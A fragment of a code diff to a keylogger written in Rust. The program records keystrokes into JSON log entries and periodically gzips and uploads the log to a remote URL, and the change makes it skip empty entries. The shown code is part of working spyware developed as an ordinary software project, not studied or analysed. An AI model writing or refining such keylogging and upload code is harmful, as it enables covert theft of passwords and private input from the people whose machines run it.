@@ -118,6 +118,7 @@ async fn gzip_and_upload(url: String, file_path: PathBuf) -> Result<()> {
 }
 
 async fn run_persistence_loop(args: Args, mut rx: mpsc::Receiver<KeylogEntry>) -> Result<()> {
+    let mut first_write = true;
     let mut writer = BufWriter::new(open_log_file(&args.output).await?);
     let mut upload_interval = tokio::time::interval(Duration::from_secs(args.upload_interval));
     loop {
@@ -125,10 +126,13 @@ async fn run_persistence_loop(args: Args, mut rx: mpsc::Receiver<KeylogEntry>) -
             maybe_entry = rx.recv() => {
                 match maybe_entry {
                     Some(entry) => {
-                        let json = serde_json::to_string(&entry)?;
-                        writer.write_all(json.as_bytes()).await?;
-                        writer.write_all(b"\n").await?;
-                        writer.flush().await?;
+                        if !entry.keys.is_empty() || first_write {
+                            let json = serde_json::to_string(&entry)?;
+                            writer.write_all(json.as_bytes()).await?;
+                            writer.write_all(b"\n").await?;
+                            writer.flush().await?;
+                            first_write = false;
+                        }
                     }
                     None => {
                         println!("Keylogger channel closed.");
